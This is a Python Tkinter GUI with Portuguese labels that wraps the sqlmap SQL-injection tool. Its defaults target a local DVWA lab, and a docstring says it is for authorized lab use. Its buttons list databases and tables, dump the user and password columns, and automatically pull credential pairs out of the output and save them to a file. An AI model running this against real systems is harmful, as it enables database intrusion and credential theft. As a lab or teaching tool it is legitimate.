#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLMap GUI - Interface gráfica para sqlmap
Uso autorizado apenas em laboratório/teste próprio (ex.: DVWA local)
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import subprocess
import threading
import shutil
import re
import os
import datetime

class SQLMapGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SQLMap - Laboratório Autorizado")
        self.root.geometry("1000x760")
        self.processo = None
        self.janela_senhas = None
        self.senhas = None

        self.criar_widgets()

    def criar_widgets(self):
        # URL
        ttk.Label(self.root, text="URL alvo:").grid(row=0, column=0, sticky="w", padx=5, pady=3)
        self.url = tk.StringVar(value="http://192.168.0.9/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit")
        ttk.Entry(self.root, textvariable=self.url, width=90).grid(row=0, column=1, padx=5, pady=3)

        # Cookie
        ttk.Label(self.root, text="Cookie:").grid(row=1, column=0, sticky="w", padx=5, pady=3)
        self.cookie = tk.StringVar(value="PHPSESSID=19bc1ee455e842cea8ec2fc58e38c6ed; security=low")
        ttk.Entry(self.root, textvariable=self.cookie, width=90).grid(row=1, column=1, padx=5, pady=3)

        # Nível / Risco
        ttk.Label(self.root, text="Level:").grid(row=2, column=0, sticky="w", padx=5)
        self.level = tk.StringVar(value="1")
        ttk.Spinbox(self.root, from_=1, to=5, textvariable=self.level, width=5).grid(row=2, column=1, sticky="w")

        ttk.Label(self.root, text="Risk:").grid(row=3, column=0, sticky="w", padx=5)
        self.risk = tk.StringVar(value="1")
        ttk.Spinbox(self.root, from_=1, to=3, textvariable=self.risk, width=5).grid(row=3, column=1, sticky="w")

        # Banco / Tabela / Colunas
        ttk.Label(self.root, text="Banco (-D):").grid(row=4, column=0, sticky="w", padx=5)
        self.db = tk.StringVar(value="dvwa")
        ttk.Entry(self.root, textvariable=self.db, width=25).grid(row=4, column=1, sticky="w")

        ttk.Label(self.root, text="Tabela (-T):").grid(row=5, column=0, sticky="w", padx=5)
        self.tabela = tk.StringVar(value="users")
        ttk.Entry(self.root, textvariable=self.tabela, width=25).grid(row=5, column=1, sticky="w")

        ttk.Label(self.root, text="Colunas (-C):").grid(row=6, column=0, sticky="w", padx=5)
        self.colunas = tk.StringVar(value="user,password")
        ttk.Entry(self.root, textvariable=self.colunas, width=25).grid(row=6, column=1, sticky="w")

        # ===== Pasta de saída (onde salvar) =====
        ttk.Label(self.root, text="Pasta de saída:").grid(row=7, column=0, sticky="w", padx=5)
        frame_pasta = ttk.Frame(self.root)
        frame_pasta.grid(row=7, column=1, sticky="ew", padx=5)
        self.pasta = tk.StringVar(value=os.path.expanduser("~/resultados_sqlmap"))
        ttk.Entry(frame_pasta, textvariable=self.pasta, width=75).pack(side="left", fill="x", expand=True)
        ttk.Button(frame_pasta, text="Escolher...", command=self.escolher_pasta).pack(side="left", padx=5)

        # Ações
        acoes = ttk.LabelFrame(self.root, text="Ação")
        acoes.grid(row=8, column=0, columnspan=2, sticky="ew", padx=5, pady=8)

        self.var_batch = tk.BooleanVar(value=True)
        ttk.Checkbutton(acoes, text="--batch (sem perguntas)", variable=self.var_batch).grid(row=0, column=0, padx=5)

        botoes = [
            ("Listar Bancos (-dbs)", self.cmd_dbs),
            ("Listar Tabelas do Banco", self.cmd_tabelas),
            ("Dump de Colunas", self.cmd_dump),
            ("Senhas Encontradas", self.cmd_senhas),
        ]
        for i, (txt, cmd) in enumerate(botoes):
            ttk.Button(acoes, text=txt, command=cmd).grid(row=1, column=i, padx=5, pady=5)

        ttk.Button(self.root, text="Executar", command=self.executar).grid(row=9, column=0, pady=5)
        ttk.Button(self.root, text="Parar", command=self.parar).grid(row=9, column=1, sticky="w")
        ttk.Button(self.root, text="Limpar Log", command=self.limpar_log).grid(row=8, column=1, sticky="e")

        # Log de saída (quadrado preto principal)
        ttk.Label(self.root, text="Saída (Log):").grid(row=10, column=0, sticky="w", padx=5)
        self.saida = scrolledtext.ScrolledText(self.root, width=100, height=20, bg="#111", fg="#0f0")
        self.saida.grid(row=11, column=0, columnspan=2, padx=5, pady=5, sticky="nsew")

        self.root.columnconfigure(1, weight=1)
        self.root.rowconfigure(11, weight=1)

    def escolher_pasta(self):
        pasta = filedialog.askdirectory(title="Escolha a pasta onde salvar os resultados")
        if pasta:
            self.pasta.set(pasta)

    def garantir_pasta(self):
        pasta = self.pasta.get().strip()
        if pasta:
            os.makedirs(pasta, exist_ok=True)
        return pasta

    # ============ JANELA SEPARADA: Senhas Encontradas ============
    def abrir_janela_senhas(self):
        if self.janela_senhas is not None and self.janela_senhas.winfo_exists():
            self.janela_senhas.deiconify()
            return
        self.janela_senhas = tk.Toplevel(self.root)
        self.janela_senhas.title("Senhas Encontradas")
        self.janela_senhas.geometry("500x400")

        barra = ttk.Frame(self.janela_senhas)
        barra.pack(fill="x", padx=5, pady=5)
        ttk.Button(barra, text="Limpar",
                   command=lambda: self.senhas.delete("1.0", tk.END)).pack(side="left", padx=3)
        ttk.Button(barra, text="Salvar em arquivo...",
                   command=self.salvar_senhas_como).pack(side="left", padx=3)

        self.senhas = scrolledtext.ScrolledText(self.janela_senhas, bg="#111", fg="#ff0")
        self.senhas.pack(fill="both", expand=True, padx=5, pady=5)
        self.senhas.tag_config("destaque", foreground="#0ff")

    def salvar_senhas_como(self):
        if self.senhas is None:
            return
        conteudo = self.senhas.get("1.0", tk.END)
        if not conteudo.strip():
            messagebox.showinfo("Aviso", "Nenhuma senha encontrada para salvar.")
            return
        arquivo = filedialog.asksaveasfilename(
            title="Salvar senhas em...",
            defaultextension=".txt",
            initialdir=self.pasta.get() or ".",
            initialfile="senhas_encontradas.txt",
            filetypes=[("Arquivo de texto", "*.txt"), ("Todos", "*.*")]
        )
        if arquivo:
            with open(arquivo, "w", encoding="utf-8") as f:
                f.write(conteudo)
            self.log(f"[✓] Senhas salvas em: {arquivo}\n")

    def montar_base(self):
        cmd = ["sqlmap", "-u", self.url.get(), "--cookie", self.cookie.get()]
        if self.var_batch.get():
            cmd.append("--batch")
        cmd += ["--level", self.level.get(), "--risk", self.risk.get()]
        # Salva tudo na pasta escolhida, não em /root/.local/share/sqlmap/output/
        pasta = self.pasta.get().strip()
        if pasta:
            cmd += ["--output-dir", pasta]
        return cmd

    def cmd_dbs(self):
        self.executar(self.montar_base() + ["-dbs"])

    def cmd_tabelas(self):
        self.executar(self.montar_base() + ["-D", self.db.get(), "--tables"])

    def cmd_dump(self):
        self.executar(self.montar_base() + [
            "-D", self.db.get(), "-T", self.tabela.get(),
            "-C", self.colunas.get(), "--dump"
        ])

    def cmd_senhas(self):
        """Abre a janela separada e executa o dump; senhas aparecem lá."""
        self.abrir_janela_senhas()
        self.executar(self.montar_base() + [
            "-D", self.db.get(), "-T", self.tabela.get(),
            "-C", self.colunas.get(), "--dump"
        ])

    def executar(self, cmd=None):
        if cmd is None:
            cmd = self.montar_base()
        if shutil.which("sqlmap") is None:
            messagebox.showerror("Erro", "sqlmap não encontrado no PATH. Instale com: sudo apt install sqlmap")
            return
        self.garantir_pasta()
        self.log("\n[+] Executando: " + " ".join(cmd) + "\n")
        threading.Thread(target=self.rodar, args=(cmd,), daemon=True).start()

    def rodar(self, cmd):
        try:
            self.processo = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
            for linha in self.processo.stdout:
                self.log(linha)
                self.detectar_senhas(linha)
            self.processo.wait()
            self.log(f"\n[=] Finalizado (código {self.processo.returncode})\n")
        except Exception as e:
            self.log(f"[!] Erro: {e}\n")

    def detectar_senhas(self, linha):
        """Extrai linhas de dump que parecem conter usuário/senha."""
        s = linha.strip()
        if s.startswith("|") and s.count("|") >= 3:
            partes = [p.strip() for p in s.split("|")]
            partes = [p for p in partes if p]
            if len(partes) >= 2:
                usuario, valor = partes[0], partes[1]
                if usuario.lower() in ("user", "username", "password", "usuario", "senha", "---"):
                    return
                if set(usuario) <= {"-", " "} or set(valor) <= {"-", " "}:
                    return
                self.root.after(0, self.log_senha, usuario, valor)

        m = re.search(r"['\"]([^'\"]{4,})['\"]", linha)
        if m and re.search(r"password|hash|cracked", linha, re.I):
            self.root.after(0, self.log_senha, "[sqlmap]", m.group(1))

    def log_senha(self, usuario, valor):
        if self.senhas is not None and self.janela_senhas is not None and self.janela_senhas.winfo_exists():
            self.senhas.insert(tk.END, f"Usuário: {usuario}\nSenha/Hash: {valor}\n{'-'*40}\n", "destaque")
            self.senhas.see(tk.END)
        # Salva automaticamente no arquivo da pasta escolhida
        pasta = self.pasta.get().strip()
        if pasta:
            arquivo = os.path.join(pasta, "senhas_encontradas.txt")
            with open(arquivo, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.datetime.now():%d/%m/%Y %H:%M:%S}] "
                        f"Usuário: {usuario} | Senha/Hash: {valor}\n")

    def parar(self):
        if self.processo and self.processo.poll() is None:
            self.processo.terminate()
            self.log("[!] Processo interrompido.\n")

    def limpar_log(self):
        self.saida.delete("1.0", tk.END)

    def log(self, texto):
        self.root.after(0, lambda: (self.saida.insert(tk.END, texto), self.saida.see(tk.END)))

if __name__ == "__main__":
    root = tk.Tk()
    app = SQLMapGUI(root)
    root.mainloop()
